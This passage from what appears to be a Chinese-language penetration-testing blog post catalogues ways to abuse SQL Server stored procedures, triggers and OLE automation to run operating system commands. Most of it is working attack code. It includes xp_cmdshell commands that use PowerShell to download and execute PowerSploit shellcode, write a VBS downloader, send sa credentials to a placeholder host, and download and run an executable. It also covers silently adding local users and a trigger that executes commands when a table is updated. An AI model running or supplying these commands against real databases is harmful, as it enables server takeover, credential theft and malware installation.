Server数据库和Sybase公司数据库产品所采用。</p><table><thead><tr><th>TDS Version</th><th>Supported Products</th></tr></thead><tbody><tr><td>4.2</td><td>Sybase SQL Server &lt; 10 and Microsoft SQL Server 6.5</td></tr><tr><td>5.0</td><td>Sybase SQL Server &gt;= 10</td></tr><tr><td>7.0</td><td>Microsoft SQL Server 7.0</td></tr><tr><td>7.1</td><td>Microsoft SQL Server 2000</td></tr><tr><td>7.2</td><td>Microsoft SQL Server 2005</td></tr></tbody></table><p>详细的协议结构分析，请参考：[<a href="http://freetds.cvs.sourceforge.net/checkout/freetds/freetds/doc/td">http://freetds.cvs.sourceforge.net/checkout/freetds/freetds/doc/td</a></p><hr><h1 id="SQL-Server一些常用的攻击面的利用方式。"><a href="#SQL-Server一些常用的攻击面的利用方式。" class="headerlink" title="SQL Server一些常用的攻击面的利用方式。"></a>SQL Server一些常用的攻击面的利用方式。</h1><h2 id="SQL-Server危险的存储过程"><a href="#SQL-Server危险的存储过程" class="headerlink" title="SQL Server危险的存储过程"></a>SQL Server危险的存储过程</h2><h3 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h3><h4 id="查询xp-cmdshell存储过程是否存在"><a href="#查询xp-cmdshell存储过程是否存在" class="headerlink" title="查询xp_cmdshell存储过程是否存在"></a>查询xp_cmdshell存储过程是否存在</h4><p>xtype为对象类型，xtype=&#39;x&#39;，表示存储过程的对象类型为扩展存储过程。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from master.dbo.sysobjects where xtype&#x3D;&#39;x&#39; and name&#x3D;&#39;xp_cmdshell&#39;</span><br></pre></td></tr></table></figure><p><img src="/images/image1.png"></p><p>TSQL代码判断是否开启xp_cmdshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">declare @RunningOnACluster char(1) declare @xp_cmdshell_available char(1) declare @result int</span><br><span class="line">set @xp_cmdshell_available&#x3D;&#39;Y&#39; set @result&#x3D;0</span><br><span class="line">select @RunningOnACluster&#x3D;case</span><br><span class="line">when convert(int, serverproperty(&#39;IsClustered&#39;)) &#x3D; 1 then &#39;Y&#39; else &#39;N&#39;</span><br><span class="line">end</span><br><span class="line">if(0&#x3D;(select value_in_use from sys.configurations where name&#x3D;&#39;xp_cmdshell&#39;)) </span><br><span class="line">set @xp_cmdshell_available&#x3D;&#39;N&#39; if @RunningOnACluster&#x3D;&#39;Y&#39;</span><br><span class="line">begin</span><br><span class="line">if @xp_cmdshell_available&#x3D;&#39;Y&#39; </span><br><span class="line">    select @result&#x3D;1 </span><br><span class="line">    if @xp_cmdshell_available&#x3D;&#39;N&#39; </span><br><span class="line">    select @result&#x3D;2</span><br><span class="line">end </span><br><span class="line">select @result</span><br></pre></td></tr></table></figure><p><img src="/images/image2.png"></p><h4 id="恢复xp-cmdshell存储过程"><a href="#恢复xp-cmdshell存储过程" class="headerlink" title="恢复xp_cmdshell存储过程"></a>恢复xp_cmdshell存储过程</h4><p>解决Error Message:未能找到存储过程’master..xp_cmdshell’。</p><p>第一步先删除：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">drop procedure sp_addextendedproc </span><br><span class="line">drop procedure sp_oacreate</span><br><span class="line">exec sp_dropextendedproc &#39;xp_cmdshell&#39;</span><br></pre></td></tr></table></figure><p>第二步恢复：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dbcc addextendedproc(&quot;sp_oacreate&quot;,&quot;odsole70.dll&quot;) </span><br><span class="line">dbcc addextendedproc(&quot;xp_cmdshell&quot;,&quot; &quot;)</span><br></pre></td></tr></table></figure><p><img src="/images/image3.png"></p><p>直接恢复，不管sp_addextendedproc是不是存在，需要自行上传xplog70.dll，恢复扩展存储过过程<br>xp_cmdshell的语句:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dbcc addextendedproc(&quot;xp_cmdshell&quot;,&quot;xplog70.dll&quot;)</span><br></pre></td></tr></table></figure><p>代码判断一系列存储过程是否存在，若不存在则恢复。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if not exists (select * from dbo.sysobjects where id &#x3D; object_id(N&#39;[dbo].</span><br><span class="line">[xp_cmdshell]&#39;))</span><br><span class="line">dbcc addextendedproc (&#39;xp_cmdshell&#39;,&#39;xplog70.dll&#39;)</span><br><span class="line">if not exists (select * from dbo.sysobjects where id &#x3D; object_id(N&#39;[dbo].</span><br><span class="line">[xp_dirtree]&#39;))</span><br><span class="line">dbcc addextendedproc (&#39;xp_dirtree&#39;,&#39;xpstar.dll&#39;)</span><br><span class="line">if not exists (select * from dbo.sysobjects where id &#x3D; object_id(N&#39;[dbo].</span><br><span class="line">[xp_fixeddrives]&#39;))</span><br><span class="line">dbcc addextendedproc (&#39;xp_fixeddrives&#39;,&#39;xpstar.dll&#39;)</span><br><span class="line">if not exists (select * from dbo.sysobjects where id &#x3D; object_id(N&#39;[dbo].</span><br><span class="line">[xp_regwrite]&#39;))</span><br><span class="line">dbcc addextendedproc (&#39;xp_regwrite&#39;,&#39;xpstar.dll&#39;)</span><br><span class="line">if not exists (select * from dbo.sysobjects where id &#x3D; object_id(N&#39;[dbo].</span><br><span class="line">[xp_regread]&#39;))</span><br><span class="line">dbcc addextendedproc (&#39;xp_regread&#39;,&#39;xpstar.dll&#39;)</span><br></pre></td></tr></table></figure><p><img src="/images/image4.png"></p><h4 id="开启xp-cmdshell存储过程"><a href="#开启xp-cmdshell存储过程" class="headerlink" title="开启xp_cmdshell存储过程"></a>开启xp_cmdshell存储过程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#39;show advanced options&#39;, 1; RECONFIGURE; exec SP_CONFIGURE</span><br><span class="line">&#39;xp_cmdshell&#39;, 1; RECONFIGURE;</span><br></pre></td></tr></table></figure><h4 id="关闭xp-cmdshell存储过程"><a href="#关闭xp-cmdshell存储过程" class="headerlink" title="关闭xp_cmdshell存储过程"></a>关闭xp_cmdshell存储过程</h4><p>关闭xp_cmdshell配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;EXEC sp_configure</span><br><span class="line">&#39;xp_cmdshell&#39;, 0;RECONFIGURE;</span><br></pre></td></tr></table></figure><p><img src="/images/image5.png"></p><p>删除xp_cmdshell的语句:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec sp_dropextendedproc &#39;xp_cmdshell&#39;;</span><br></pre></td></tr></table></figure><p>删除xp_cmdshell过程，再添加xp_cmdshell过程，需要自行上传xplog70.dll恢复被删除的 xp_cmdshell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">drop procedure xp_cmdshell;</span><br><span class="line">exec sp_addextendedproc &quot;xp_cmdshell&quot;, &quot;xplog70.dll&quot;;</span><br></pre></td></tr></table></figure><p>附录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">exec sp_addextendedproc xp_cmdshell ,@dllname &#x3D;&#39;xplog70.dll&#39;</span><br><span class="line">exec sp_addextendedproc xp_enumgroups ,@dllname &#x3D;&#39;xplog70.dll&#39;</span><br><span class="line">exec sp_addextendedproc xp_loginconfig ,@dllname &#x3D;&#39;xplog70.dll&#39;</span><br><span class="line">exec sp_addextendedproc xp_enumerrorlogs ,@dllname &#x3D;&#39;xpstar.dll&#39;</span><br><span class="line">exec sp_addextendedproc xp_getfiledetails ,@dllname &#x3D;&#39;xpstar.dll&#39;</span><br><span class="line">exec sp_addextendedproc Sp_OACreate ,@dllname &#x3D;&#39;odsole70.dll&#39;</span><br><span class="line">exec sp_addextendedproc Sp_OADestroy ,@dllname &#x3D;&#39;odsole70.dll&#39;</span><br><span class="line">exec sp_addextendedproc Sp_OAGetErrorInfo ,@dllname &#x3D;&#39;odsole70.dll&#39;</span><br><span class="line">exec sp_addextendedproc Sp_OAGetProperty ,@dllname &#x3D;&#39;odsole70.dll&#39;</span><br><span class="line">exec sp_addextendedproc Sp_OAMethod ,@dllname &#x3D;&#39;odsole70.dll&#39;</span><br><span class="line">exec sp_addextendedproc Sp_OASetProperty ,@dllname &#x3D;&#39;odsole70.dll&#39;</span><br><span class="line">exec sp_addextendedproc Sp_OAStop ,@dllname &#x3D;&#39;odsole70.dll&#39;</span><br><span class="line">exec sp_addextendedproc xp_regaddmultistring ,@dllname &#x3D;&#39;xpstar.dll&#39;</span><br><span class="line">exec sp_addextendedproc xp_regdeletekey ,@dllname &#x3D;&#39;xpstar.dll&#39;</span><br><span class="line">exec sp_addextendedproc xp_regdeletevalue ,@dllname &#x3D;&#39;xpstar.dll&#39;</span><br><span class="line">exec sp_addextendedproc xp_regenumvalues ,@dllname &#x3D;&#39;xpstar.dll&#39;</span><br><span class="line">exec sp_addextendedproc xp_regremovemultistring ,@dllname &#x3D;&#39;xpstar.dll&#39;</span><br><span class="line">exec sp_addextendedproc xp_regwrite ,@dllname &#x3D;&#39;xpstar.dll&#39;</span><br><span class="line">exec sp_addextendedproc xp_dirtree ,@dllname &#x3D;&#39;xpstar.dll&#39;</span><br><span class="line">exec sp_addextendedproc xp_regread ,@dllname &#x3D;&#39;xpstar.dll&#39;</span><br><span class="line">exec sp_addextendedproc xp_fixeddrives ,@dllname &#x3D;&#39;xpstar.dll&#39;</span><br></pre></td></tr></table></figure><h4 id="xp-cmdshell执行系统命令"><a href="#xp-cmdshell执行系统命令" class="headerlink" title="xp_cmdshell执行系统命令"></a>xp_cmdshell执行系统命令</h4><h5 id="xp-cmdshell执行whoami命令"><a href="#xp-cmdshell执行whoami命令" class="headerlink" title="xp_cmdshell执行whoami命令"></a>xp_cmdshell执行whoami命令</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec master.dbo.xp_cmdshell &#39;whoami&#39;</span><br><span class="line">exec xp_cmdshell &quot;whoami&quot;;</span><br></pre></td></tr></table></figure><p><img src="/images/image7.png"></p><h5 id="xp-cmdshell执行ipconfig-all命令"><a href="#xp-cmdshell执行ipconfig-all命令" class="headerlink" title="xp_cmdshell执行ipconfig/all命令"></a>xp_cmdshell执行ipconfig/all命令</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#39;ipconfig&#x2F;all&#39;</span><br></pre></td></tr></table></figure><p><img src="/images/image8.png"></p><h5 id="查询操作系统和版本信息（分别对应中英文系统）"><a href="#查询操作系统和版本信息（分别对应中英文系统）" class="headerlink" title="查询操作系统和版本信息（分别对应中英文系统）"></a>查询操作系统和版本信息（分别对应中英文系统）</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#39;systeminfo | findstr &#x2F;B &#x2F;C:&quot;OS Name&quot; &#x2F;C:&quot;OS Version&quot;&#39; </span><br><span class="line">exec master..xp_cmdshell &#39;systeminfo | findstr &#x2F;B &#x2F;C:&quot;OS 名称&quot; &#x2F;C:&quot;OS 版本&quot;&#39;</span><br></pre></td></tr></table></figure><p><img src="/images/image9.png"></p><h5 id="通过xp-cmdshell执行wmic-获取系统信息"><a href="#通过xp-cmdshell执行wmic-获取系统信息" class="headerlink" title="通过xp_cmdshell执行wmic 获取系统信息"></a>通过xp_cmdshell执行wmic 获取系统信息</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#39;wmic cpu get name,NumberOfCores,NumberOfLogicalProcessors&#x2F;Format:List&#39;</span><br></pre></td></tr></table></figure><p><img src="/images/image10.png"></p><h5 id="调用reg-query注册表键值判断RDP服务的端口号"><a href="#调用reg-query注册表键值判断RDP服务的端口号" class="headerlink" title="调用reg query注册表键值判断RDP服务的端口号"></a>调用reg query注册表键值判断RDP服务的端口号</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#39;reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp &#x2F;v PortNumber&#39;</span><br></pre></td></tr></table></figure><p><img src="/images/image11.png"></p><h5 id="通过xp-cmdshell执行添加testuser1用户并且不输出结果"><a href="#通过xp-cmdshell执行添加testuser1用户并且不输出结果" class="headerlink" title="通过xp_cmdshell执行添加testuser1用户并且不输出结果"></a>通过xp_cmdshell执行添加testuser1用户并且不输出结果</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#39;Net user testuser1 passwd1 &#x2F;workstations:* &#x2F;times:all &#x2F;passwordchg:yes &#x2F;passwordreq:yes &#x2F;active:yes &#x2F;add&#39;,NO_OUTPUT</span><br></pre></td></tr></table></figure><p><img src="/images/image12.png"></p><h5 id="通过xp-cmdshell删除testuser1用户并且不输出结果"><a href="#通过xp-cmdshell删除testuser1用户并且不输出结果" class="headerlink" title="通过xp_cmdshell删除testuser1用户并且不输出结果"></a>通过xp_cmdshell删除testuser1用户并且不输出结果</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC master..xp_cmdshell &#39;net user testuser1&#x2F;delete&#39;, NO_OUTPUT</span><br></pre></td></tr></table></figure><p><img src="/images/image13.png"></p><p>通过xp_cmdshell执行taskkill 杀死taskmgr.exe，taskmgr.exe用于任务管理器。它显示系统中正在运行的进程。该程序使用Ctrl+Alt+Del（一般是弹出Windows安全再点击“任务管理器”）或者 Ctrl+Shift+Esc打开，这不是纯粹的系统程序，但是如果终止它，可能会导致不可知的问题。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master.dbo.xp_cmdshell &#39;taskkill &#x2F;f &#x2F;im taskmgr.exe&#39;;</span><br></pre></td></tr></table></figure><h5 id="调用xp-cmdshell执行mkdir命令创建目录"><a href="#调用xp-cmdshell执行mkdir命令创建目录" class="headerlink" title="调用xp_cmdshell执行mkdir命令创建目录"></a>调用xp_cmdshell执行mkdir命令创建目录</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#39;mkdir &quot;C:\test\&quot; &#39;</span><br></pre></td></tr></table></figure><p><img src="/images/image14.png"></p><h5 id="通过xp-cmdshell执行dir命令"><a href="#通过xp-cmdshell执行dir命令" class="headerlink" title="通过xp_cmdshell执行dir命令"></a>通过xp_cmdshell执行dir命令</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#39;dir c:\&#39; </span><br><span class="line">exec xp_cmdshell &#39;dir c:\&#39;</span><br></pre></td></tr></table></figure><p><img src="/images/image15.png"></p><h5 id="通过xp-cmdshell删除文件"><a href="#通过xp-cmdshell删除文件" class="headerlink" title="通过xp_cmdshell删除文件"></a>通过xp_cmdshell删除文件</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#39;del C:\test&#39;;</span><br></pre></td></tr></table></figure><h5 id="xp-cmdshell调用Powershell"><a href="#xp-cmdshell调用Powershell" class="headerlink" title="xp_cmdshell调用Powershell"></a>xp_cmdshell调用Powershell</h5><p>通过xp_cmdshell调用powershell 下载<a href="http://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1">http://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_cmdshell &#39;powershell -c &quot;iex((new-object Net.WebClient).DownloadString(&#39;&#39;http:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;cheetz&#x2F;PowerSpl oit&#x2F;master&#x2F;CodeExecution&#x2F;Invoke--Shellcode.ps1&#39;&#39;))&quot;&#39;</span><br></pre></td></tr></table></figure><p><img src="/images/image16.png"></p><p>调用xp_cmdshell执行echo  CreateObject最后写入C:/ProgramData/vget.vbs文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#39;echo Set x&#x3D; CreateObject(^&quot;Microsoft.XMLHTTP^&quot;):x.Open</span><br><span class="line">^&quot;GET^&quot;,LCase(WScript.Arguments(0)),0:x.Send():Set s &#x3D; CreateObject(^&quot;ADODB.Stream^&quot;):s.Mode &#x3D; 3:s.Type &#x3D; 1:s.Open():s.Write(x.responseBody):s.SaveToFile LCase(WScript.Arguments(1)),2 &gt; C:&#x2F;ProgramData&#x2F;vget.vbs&#39;;</span><br></pre></td></tr></table></figure><p><img src="/images/image17.png"></p><p>通过xp_cmdshell调用cmd.exe 执行powershell调用OpenRead方法向数据库发送登录用户名sa密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_cmdshell &#39;powershell (new-object System.Net.WebClient).OpenRead(&#39;&#39;http:&#x2F;&#x2F;example&#x2F;test.jsp? data&#x3D;127.0.0.1%7c1433%7csa%7cDb123456&#39;&#39;)&#39;</span><br></pre></td></tr></table></figure><p><img src="/images/image18.png"></p><p>通过xp_cmdshell调用powershell下载test0.exe后并执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#39;&quot;echo $client &#x3D; New-Object System.Net.WebClient &gt;</span><br><span class="line">%TEMP%\test.ps1 &amp; echo</span><br><span class="line">$client.DownloadFile(&quot;http:&#x2F;&#x2F;example&#x2F;test0.exe&quot;,&quot;%TEMP%\test.exe&quot;) &gt;&gt;</span><br><span class="line">%TEMP%\test.ps1 &amp; powershell -ExecutionPolicy Bypass %temp%\test.ps1 &amp; WMIC process call create &quot;%TEMP%\test.exe&quot;&quot;&#39;</span><br></pre></td></tr></table></figure><hr><h3 id="xp-regread"><a href="#xp-regread" class="headerlink" title="xp_regread"></a>xp_regread</h3><p>SQL Server存在一系列的存储过程，可以对注册表进行增删改查。xp_regread、xp_regwrite、xp_regdeletvalue、xp_regdeletkey、xp_regaddmultistring等。</p><h4 id="读注册表"><a href="#读注册表" class="headerlink" title="读注册表"></a>读注册表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_regread &#39;HKEY_current_user&#39;,&#39;Control Panel\International&#39;,&#39;sCountry&#39; exec xp_regread N&#39;HKEY_LOCAL_MACHINE&#39;, N&#39;SYSTEM\CurrentControlSet\Services\MSSEARCH&#39;</span><br></pre></td></tr></table></figure><p><img src="/images/image19.png"></p><h4 id="枚举可用的注册表键值"><a href="#枚举可用的注册表键值" class="headerlink" title="枚举可用的注册表键值"></a>枚举可用的注册表键值</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_regenumkeys &#39;HKEY_CURRENT_USER&#39;,&#39;Control Panel\International&#39;</span><br></pre></td></tr></table></figure><p><img src="/images/image20.png"></p><hr><h3 id="xp-fileexist"><a href="#xp-fileexist" class="headerlink" title="xp_fileexist"></a>xp_fileexist</h3><p>判读文件是否存在，第一列返回0表示文件不存在，返回1表示文件存在。当执行完无回显命令时，一般都将结果输入至文件中，利用此存储过程可以判断无回显命令是否执行成功。</p><h4 id="判读文件是否存在"><a href="#判读文件是否存在" class="headerlink" title="判读文件是否存在"></a>判读文件是否存在</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_fileexist &#39;C:\\test\test.txt&#39;</span><br></pre></td></tr></table></figure><p><img src="/images/image21.png"></p><hr><h4 id="列出当前目录"><a href="#列出当前目录" class="headerlink" title="列出当前目录"></a>列出当前目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_subdirs &quot;C:\\&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/image22.png"></p><hr><h3 id="xp-getnetname"><a href="#xp-getnetname" class="headerlink" title="xp_getnetname"></a>xp_getnetname</h3><h4 id="获取服务器名称"><a href="#获取服务器名称" class="headerlink" title="获取服务器名称"></a>获取服务器名称</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_getnetname</span><br></pre></td></tr></table></figure><p><img src="/images/image23.png"></p><hr><h3 id="xp-msver"><a href="#xp-msver" class="headerlink" title="xp_msver"></a>xp_msver</h3><h4 id="获取服务器信息"><a href="#获取服务器信息" class="headerlink" title="获取服务器信息"></a>获取服务器信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_msver</span><br></pre></td></tr></table></figure><p><img src="/images/image24.png"></p><hr><h3 id="xp-fixeddrives"><a href="#xp-fixeddrives" class="headerlink" title="xp_fixeddrives"></a>xp_fixeddrives</h3><h4 id="获取磁盘空间信息"><a href="#获取磁盘空间信息" class="headerlink" title="获取磁盘空间信息"></a>获取磁盘空间信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_fixeddrives</span><br></pre></td></tr></table></figure><p><img src="/images/image25.png"></p><p>附常用的一些危险的存储过程，可自查存储过程的功能和用法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell </span><br><span class="line">xp_dirtree </span><br><span class="line">xp_enumgroups </span><br><span class="line">xp_fixeddrives </span><br><span class="line">xp_loginconfig </span><br><span class="line">xp_enumerrorlogs </span><br><span class="line">xp_getfiledetails </span><br><span class="line">Sp_OACreate </span><br><span class="line">Sp_OADestroy </span><br><span class="line">Sp_OAGetErrorInfo </span><br><span class="line">Sp_OAGetProperty </span><br><span class="line">Sp_OAMethod </span><br><span class="line">Sp_OASetProperty </span><br><span class="line">Sp_OAStop </span><br><span class="line">Xp_regaddmultistring </span><br><span class="line">Xp_regdeletekey </span><br><span class="line">Xp_regdeletevalue </span><br><span class="line">Xp_regenumvalues </span><br><span class="line">Xp_regread</span><br><span class="line">Xp_regremovemultistring </span><br><span class="line">Xp_regwrite </span><br><span class="line">sp_makewebtask</span><br></pre></td></tr></table></figure><hr><h2 id="SQL-Server-触发器"><a href="#SQL-Server-触发器" class="headerlink" title="SQL Server 触发器"></a>SQL Server 触发器</h2><p>SQL Server 触发器用于执行指定动作之后执行sql语句，比如配合update触发sql语句。首先创建一个test表，插入字段值。</p><p><img src="/images/image26.png"><br><img src="/images/image27.png"></p><p>创建一个名为test1的触发器，当test表执行update动作时，触发test1执行xp_cmdshell命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">set ANSI_NULLS on go</span><br><span class="line">set QUOTED_IDENTIFIER on</span><br><span class="line">go</span><br><span class="line">create trigger [test1] </span><br><span class="line">on [test]</span><br><span class="line">AFTER UPDATE as</span><br><span class="line">begin</span><br><span class="line">execute master..xp_cmdshell &#39;cmd.exe &#x2F;c calc.exe&#39;</span><br><span class="line">end go</span><br></pre></td></tr></table></figure><p><img src="/images/image28.png"><br>执行下列更新test表操作，test1触发器触发。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE test SET name &#x3D; &#39;wangwu&#39; WHERE LastName &#x3D; &#39;zhangsan&#39;</span><br></pre></td></tr></table></figure><p><img src="/images/image29.png"></p><hr><h2 id="SQL-Server-COM组件"><a href="#SQL-Server-COM组件" class="headerlink" title="SQL Server COM组件"></a>SQL Server COM组件</h2><p>SQL Server中的COM组件SP_OACREATE，执行系统命令，但是此利用方法无回显。</p><h3 id="SP-OACREATE"><a href="#SP-OACREATE" class="headerlink" title="SP_OACREATE"></a>SP_OACREATE</h3><p>查看SP_OACREATE状态。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from master.dbo.sysobjects where xtype&#x3D;&#39;x&#39; and name&#x3D;&#39;SP_OACREATE&#39;</span><br></pre></td></tr></table></figure><p><img src="/images/image30.png"></p><p>利用count(*)判断是否存在，，存在即返回1。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from master.dbo.sysobjects where xtype&#x3D;&#39;x&#39; and name&#x3D;&#39;SP_OACREATE&#39;</span><br></pre></td></tr></table></figure><p><img src="/images/image31.png"></p><h3 id="启用SP-OACREATE"><a href="#启用SP-OACREATE" class="headerlink" title="启用SP_OACREATE"></a>启用SP_OACREATE</h3><p>利用sp_configure存储过程，启用SP_OACREATE</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#39;show advanced options&#39;, 1; RECONFIGURE WITH OVERRIDE; </span><br><span class="line">exec sp_configure &#39;Ole Automation Procedures&#39;, 1; RECONFIGURE WITH OVERRIDE;</span><br></pre></td></tr></table></figure><p><img src="/images/image32.png"></p><h3 id="利用SP-OACREATE执行命令"><a href="#利用SP-OACREATE执行命令" class="headerlink" title="利用SP_OACREATE执行命令"></a>利用SP_OACREATE执行命令</h3><p>利用SP_OACREATE执行系统命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;C:\Windows\System32\cmd.exe &#x2F;c whoami &#x2F;all &gt;C:\\test\test.txt&#39;</span><br></pre></td></tr></table></figure><p><img src="/images/image33.png"></p><hr><h2 id="SQL-Server-CLR相关利用"><a href="#SQL-Server-CLR相关利用" class="headerlink" title="SQL Server CLR相关利用"></a>SQL Server CLR相关利用</h2><hr><p>CLR微软官方把他称为公共语言运行时，从 SQL Server 2005 (9.x) 开始，SQL Server 集成了用于Microsoft Windows 的 .NET Framework 的公共语言运行时 (CLR) 组件。这意味着现在可以使用任何.NET Framework 语言（包括 Microsoft Visual Basic .NET 和Microsoft Visual C#）来编写存储过程、触发器、用户定义类型、用户定义函数、用户定义聚合和流式表值函数。官方链接：<a href="https://docs.microsoft.com/zh-cn/sql/relational-databases/clr-integration/common-language-runtime-clr-integration-programming-concepts?view=sql-server-ver15">https://docs.microsoft.com/zh-cn/sql/relational-databases/clr-integration/common-language-runtime-clr-integration-programming-concepts?view=sql-server-ver15</a> 